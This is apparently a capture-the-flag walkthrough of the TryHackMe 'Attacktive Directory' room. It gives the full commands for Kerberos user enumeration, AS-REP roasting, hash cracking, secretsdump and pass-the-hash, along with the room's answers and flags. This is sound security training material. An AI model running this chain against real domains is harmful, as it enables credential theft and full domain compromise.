# THM - Attacktive Directory

<br>

## Task 2

https://github.com/SecureAuthCorp/impacket

```bash
sudo apt update && sudo apt upgrade

mkdir ../../Tools/impacket

git clone https://github.com/SecureAuthCorp/impacket.git ../../Tools/impacket

pip3 install -r ../../Tools/impacket/requirements.txt

cd ../../Tools/impacket/ && sudo python3 ./setup.py install

sudo apt install bloodhound neo4j
```

## Task 3

http://10.10.68.116/

```bash
cd ../../Rooms/attacktivedirectory/

mkdir scans
nmap -p- -sV -sC -oN scans/nmap.txt 10.10.68.116
```

### Task 3.1

```bash
enum4linux 10.10.68.116 | tee scans/enum4linux.txt
```

> enum4linux

### Task 3.2

> THM-AD

### Task 3.3

> .local

<br>

## Task 4

https://github.com/ropnop/kerbrute/releases

```bash
wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt

../../Tools/kerbrute/kerbrute_linux_amd64 --help

mkdir logs

../../Tools/kerbrute/kerbrute_linux_amd64 userenum --dc 10.10.68.116 -d spookysec.local ./userlist.txt -o ./logs/kerbrute_log.txt
```

### Task 4.1

> userenum

### Task 4.2

> svc-admin

### Task 4.3

> backup

<br>

## Task 5

https://github.com/SecureAuthCorp/impacket

```bash
cat ./logs/kerbrute_log.txt | awk '{ print $0 }' | cut -s -f1 -d"@" | cut -f8 -d" " > validuserlist.txt

python3 ../../Tools/impacket/examples/GetNPUsers.py -no-pass -usersfile validuserlist.txt -dc-ip 10.10.68.116 spookysec.local/ | tee ./logs/GetNPUsers_log.txt
```

### Task 5.1

```bash
cat logs/GetNPUsers_log.txt
```

> svc-admin

### Task 5.2

```bash
haiti '$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9a0f8dce114bc1506a9eba3734f76c54$84f69648f1ac1abc5616514ae0aca55df62c20c6c04cac5a226591ab5dd9c2e73446d106533170230078421f8ece9a8ec8a5d07c6ce7e308877e599d1507b2ded8a70bcca3d1443c992ed83b3e17b2af54973e7495dde153e083e3362f366b4c7bfd1bb771c31fac47b63cb90254bd8eb5e686a8155f168df5320b82b6876f90a5f260c2a7c83e88d55aa837760868a39e80b46168bf7d4f714bb9897222d80a4737f8b9afcbe5abf87cb29189e09d66d634028fed321a7c0be523ac5b49d9f05755a074a654340415586b5838ee4f3e4b8906bfe48b0f9b26c5841522c22d0c1ff94a1ebd9aa2cf0556ac675a9c33d93fd4' | tee ./logs/haiti_log.txt
```

> Kerberos 5 AS-REP etype 23

### Task 5.3

> 18200

### Task 5.4

```bash
echo '$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:9a0f8dce114bc1506a9eba3734f76c54$84f69648f1ac1abc5616514ae0aca55df62c20c6c04cac5a226591ab5dd9c2e73446d106533170230078421f8ece9a8ec8a5d07c6ce7e308877e599d1507b2ded8a70bcca3d1443c992ed83b3e17b2af54973e7495dde153e083e3362f366b4c7bfd1bb771c31fac47b63cb90254bd8eb5e686a8155f168df5320b82b6876f90a5f260c2a7c83e88d55aa837760868a39e80b46168bf7d4f714bb9897222d80a4737f8b9afcbe5abf87cb29189e09d66d634028fed321a7c0be523ac5b49d9f05755a074a654340415586b5838ee4f3e4b8906bfe48b0f9b26c5841522c22d0c1ff94a1ebd9aa2cf0556ac675a9c33d93fd4' > hash.txt

hashcat -m 18200 -o ./logs/hashcat_log.txt hash.txt passwordlist.txt
```

> management2005

<br>

## Task 6

### Task 6.1

> smbclient

### Task 6.2

> -L

### Task 6.3

```bash
smbclient -L 10.10.68.116 -U "svc-admin" | tee ./scans/smbclient.txt
	management2005
```

> 6

### Task 6.4

> backup

### Task 6.5

```bash
smbclient \\\\10.10.68.116\\backup -U "svc-admin"
	management2005
	
	dir
	get backup_credentials.txt
	exit

cat backup_credentials.txt
```

```bash
cat backup_credentials.txt
```

> YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

### Task 6.6

```bash
base64 -d backup_credentials.txt | tee backup_credentials_base64_d.txt
```

> backup@spookysec.local:backup2517860

<br>

## Task 7

```bash
python3 ../../Tools/impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.68.116 | tee logs/secretsdump_log.txt
```

### Task 7.1

> DRSUAPI

### Task 7.2

> 0e0363213e37b94221497260b0bcb4fc

### Task 7.3

> pass the hash

### Task 7.4

```bash
sudo gem install evil-winrm

evil-winrm -h
```

> -H

<br>

## Task 8

### Task 8.1

```shell
evil-winrm -i 10.10.68.116 -u Administrator -H '0e0363213e37b94221497260b0bcb4fc'

	cd C:\Users\svc-admin\Desktop
	dir
	type user.txt.txt
```

> TryHackMe{K3rb3r0s_Pr3_4uth}

### Task 8.2

```shell
	cd C:\Users\backup\Desktop
	dir
	type PrivEsc.txt
```

> TryHackMe{B4ckM3UpSc0tty!}

### Task 8.3

```shell
	cd C:\Users\Administrator\Desktop
	dir
	type root.txt
```

> TryHackMe{4ctiveD1rectoryM4st3r}

<br>

